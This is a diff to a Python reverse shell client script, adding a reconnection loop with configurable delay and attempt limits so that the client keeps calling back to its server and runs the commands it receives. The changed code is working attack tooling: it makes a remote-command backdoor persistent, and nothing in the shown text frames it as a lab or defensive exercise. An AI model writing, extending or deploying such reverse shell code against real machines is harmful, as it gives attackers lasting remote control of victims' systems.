@@ -3,6 +3,7 @@ import os
 import subprocess
 import datetime
 import json
+import time
 
 # Load configuration from config.json
 def load_config():
@@ -128,26 +129,74 @@ def main():
         # Use values from config file
         host = config["client"].get("server_ip", "127.0.0.1")
         port = config["client"].get("server_port", 9999)
+        reconnect_enabled = config["client"].get("reconnect_enabled", False)
+        reconnect_delay = config["client"].get("reconnect_delay", 5)
+        max_attempts = config["client"].get("max_reconnect_attempts", 0)
     else:
         # Fallback to default values
         host = "127.0.0.1"
         port = 9999
+        reconnect_enabled = False
+        reconnect_delay = 5
+        max_attempts = 0
         log_message("Using default configuration", "WARNING")
     
     log_message("=" * 50)
     log_message("Reverse Shell Client Starting...")
     log_message("=" * 50)
-    log_message(f"Attempting to connect to {host}:{port}")
     
-    # Connect to server
-    s = connect_to_server(host, port)
+    attempt = 0
     
-    if s is None:
-        log_message("Failed to connect to server. Exiting...", "ERROR")
-        return
-    
-    # Execute commands
-    execute_commands(s)
+    # Main connection loop
+    while True:
+        attempt += 1
+        
+        # Check if we've exceeded max attempts
+        if max_attempts > 0 and attempt > max_attempts:
+            log_message(f"Maximum reconnection attempts ({max_attempts}) reached. Exiting...", "ERROR")
+            break
+        
+        # Show attempt number if reconnecting
+        if attempt > 1:
+            log_message(f"Reconnection attempt {attempt}...")
+        
+        log_message(f"Attempting to connect to {host}:{port}")
+        
+        # Try to connect
+        s = connect_to_server(host, port)
+        
+        if s is not None:
+            # Connection successful
+            log_message("Connection established successfully")
+            
+            # Execute commands
+            execute_commands(s)
+            
+            # If we reach here, connection was lost during operation
+            log_message("Connection lost", "WARNING")
+            
+            # Check if reconnect is enabled
+            if not reconnect_enabled:
+                log_message("Auto-reconnect is disabled. Exiting...", "WARNING")
+                break
+            
+            # Wait before reconnecting
+            log_message(f"Waiting {reconnect_delay} seconds before reconnecting...")
+            time.sleep(reconnect_delay)
+        else:
+            # Connection failed
+            if not reconnect_enabled:
+                log_message("Failed to connect to server. Exiting...", "ERROR")
+                break
+            
+            # Wait before retrying
+            if max_attempts == 0:
+                log_message(f"Connection failed. Retrying in {reconnect_delay} seconds...", "WARNING")
+            else:
+                remaining = max_attempts - attempt
+                log_message(f"Connection failed. {remaining} attempts remaining. Retrying in {reconnect_delay} seconds...", "WARNING")
+            
+            time.sleep(reconnect_delay)
     
     log_message("Client shutting down...")
 
